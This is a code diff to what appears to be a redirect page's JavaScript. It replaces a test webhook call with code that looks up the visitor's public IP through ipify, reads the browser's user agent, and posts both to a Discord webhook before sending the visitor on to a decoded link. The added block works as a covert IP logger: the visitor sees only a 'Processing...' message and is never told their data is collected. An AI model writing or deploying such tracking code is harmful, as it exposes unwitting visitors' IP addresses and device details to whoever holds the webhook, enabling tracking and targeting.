@@ -92,31 +92,42 @@
                     loadingMessage.textContent = 'Processing...';
                     document.body.appendChild(loadingMessage);
 
-                    // Send 'test' data to the Discord webhook via a POST request
-                    fetch(webhook, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({ 
-                            content: "test"  // This is the correct payload for Discord
-                        }),  
-                    })
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error("Failed to send webhook. Status: " + response.status);
-                        }
-                        console.log('Webhook sent:', response);
-                    })
-                    .catch(error => {
-                        console.error('Error sending webhook:', error);
-                    })
-                    .finally(() => {
-                        // Redirect to the decoded link
-                        setTimeout(() => {
-                            window.location.href = link;
-                        }, 500);  // Delay to allow the webhook to be sent
-                    });
+                    // Fetch the user's IP address using ipify
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => {
+                            const userIP = data.ip;
+                            const userAgent = navigator.userAgent; // Get device info
+
+                            // Prepare the message to send to Discord
+                            const message = {
+                                content: `User IP: ${userIP}\nDevice Info: ${userAgent}`
+                            };
+
+                            // Send the IP and device info to the Discord webhook via a POST request
+                            return fetch(webhook, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify(message),  
+                            });
+                        })
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error("Failed to send webhook. Status: " + response.status);
+                            }
+                            console.log('Webhook sent:', response);
+                        })
+                        .catch(error => {
+                            console.error('Error sending webhook:', error);
+                        })
+                        .finally(() => {
+                            // Redirect to the decoded link
+                            setTimeout(() => {
+                                window.location.href = link;
+                            }, 500);  // Delay to allow the webhook to be sent
+                        });
 
                 } catch (error) {
                     console.error('Error decoding or processing:', error);
